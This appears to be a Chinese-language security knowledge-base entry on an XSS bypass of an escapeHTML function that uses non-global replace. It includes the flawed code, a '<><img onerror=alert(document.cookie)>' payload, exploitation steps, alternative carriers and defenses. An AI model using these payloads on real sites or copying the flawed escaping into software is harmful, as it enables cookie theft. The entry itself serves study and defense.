---
id: web-generic-xss-nonglobal-replace-first-match-bypass
title: 前端 escapeHTML 使用非全局 replace 只替换首个尖括号，前缀填充即可绕过
type: scenario
domain: web
path: web/generic/xss
technique: nonglobal-replace-escape-bypass
tags:
- xss
- dom-xss
- client-side-escaping
- javascript-replace
- bypass
- stored-xss
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V13
  verified_at: '2026-11-05T01:50:02+08:00'
  notes: 已对照原文核对：escapeHTML 非全局 replace 只替换首个 < 和 >，<><img onerror> 前缀填充绕过与原文 payload 一致；未实际执行
url: /docs/web/generic/xss/web-generic-xss-nonglobal-replace-first-match-bypass/
draft: false
kb_aliases:
- escapeHTML 绕过
- replace 非全局绕过
- 首字符替换 XSS
- 前缀填充绕过
---

## 一句话结论

前端用 `html.replace('<','&lt;').replace('>','&gt;')` 做“转义”时，`String.prototype.replace` 传字符串参数只替换第一个匹配；攻击者在 payload 前放一组 `<>` 消耗掉这两次替换，真正的 `<img onerror=...>` 便原样进入 `innerHTML` 执行。

## 原理

- JavaScript 的 `String.prototype.replace(search, replacement)`：当 `search` 是字符串（而非带 `g` 标志的正则）时，只替换**第一个**匹配项，后续相同字符不变。
- 有缺陷的 `escapeHTML` 链式调用两次：
  ```js
  html.replace('<', '&lt;').replace('>', '&gt;')
  ```
  第一次只替换第一个 `<`，第二次只替换第一个 `>`。
- 攻击者输入 `<><img src=x onerror=alert(document.cookie)>`：
  - 第一个 `<`（前缀）被替换为 `&lt;`；
  - 第一个 `>`（前缀的闭合）被替换为 `&gt;`；
  - 后面的 `<img src=x onerror=...>` 没有任何字符被处理，保持原样。
- 结果字符串被赋给 `innerHTML`，浏览器重新解析 HTML，`<img>` 标签与 `onerror` 事件处理器生效。
- 根因：转义函数不符合“全量替换”的语义，且用字符串拼接 + `innerHTML` 作为 sink；任何只处理首次出现的净化逻辑都可以用“垃圾前缀”消耗掉。

## 触发条件

- 存在存储型或反射型 HTML 注入点，输入最终进入 `innerHTML`/`outerHTML`/`document.write`；
- 客户端（或服务端）使用字符串形式的 `replace` 做转义，未加 `g` 标志、未使用正则全局匹配；
- 其他过滤（如 `<>` 前缀被允许）不会阻止前缀字符出现；
- 页面未部署可阻断内联事件处理器的严格 CSP。

## 利用步骤

1. 确认数据进入 `innerHTML` 且前端调用了自定义 `escapeHTML`（查看源码/打包产物）。
2. 提交单组 `<img src=x onerror=alert(1)>`，若被转义成 `&lt;img...&gt;`，说明有过滤。
3. 在前面加一组 `<>`：`<><img src=x onerror=alert(1)>`，使前两个尖括号被消耗。
4. 观察后续标签是否原样出现在 DOM 中并触发。
5. 若 `onerror` 被过滤，换 `<svg onload=...>`、`<iframe srcdoc=...>` 等载体。

## PoC

```javascript
// 有缺陷的转义函数
function escapeHTML(html) {
  if (!html) return '';
  return html.replace('<', '&lt;').replace('>', '&gt;');
}
const safeText = escapeHTML(comment.text);
item.innerHTML = `<div class="comment-body">${safeText}</div>`;
```

```html
<!-- 输入：前两个尖括号被消耗，后面的 img 原样保留 -->
<><img src=x onerror=alert(document.cookie)>
```

```text
# escapeHTML 结果：
&lt;&gt;<img src=x onerror=alert(document.cookie)>
# innerHTML 解析后 img 的 onerror 执行
```

## 变体与关联

- 变体：只替换首个 `&`、`"`、`'` 时同理，用对应字符填充前缀。
- 变体：后端 `str_replace` 只替换一次（非递归）也能用双写绕过，见 [[web-generic-xss-filter-bypass-encoding-obfuscation]]。
- 变体：仅删除 `script` 的正则未加 `g`/`i` 时，可用大小写或前缀填充。
- 关联：[[web-generic-xss-scriptless-execution-vectors]]（img/svg 事件载体）；[[web-generic-xss-javascript-context-injection]]（其他上下文编码错误）。

## 检测与防御

- 检测：代码审计搜索 `.replace('<',`、`.replace('>',`、`.replace(/</,` 等无 `g` 标志的转义；前端 bundle 中的自定义 `escapeHTML`。
- 检测：提交 `<>` 前缀 + 标签的探测请求，观察响应/DOM 是否保留后续标签。
- 防御：不要用字符串替换做 HTML 转义；使用 `textContent`/`innerText` 赋值，或成熟 sanitizer（DOMPurify）输出。
- 防御：必须转义时使用全局正则 `/</g`、`/>/g`、`/&/g` 并先处理 `&`；更推荐由框架的自动转义负责。
- 防御：部署 CSP，禁止 `unsafe-inline` 事件处理器（`script-src` 不含 `unsafe-inline` 时可阻断内联事件）。
